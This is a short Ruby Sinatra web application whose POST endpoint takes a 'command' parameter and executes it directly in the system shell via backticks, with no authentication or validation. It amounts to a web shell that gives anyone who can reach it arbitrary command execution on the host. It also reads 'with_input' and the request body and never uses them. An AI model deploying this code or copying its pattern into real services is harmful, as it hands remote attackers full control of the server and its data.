require 'sinatra'

set :server, :puma

get '/' do
  'POST to / with a command parameter and optional input in post data.'
end

post '/' do
  command = params["command"]
  # with input or not, default to false
  with_input = params["with_input"]
  input = request.body
  `#{command}`
end

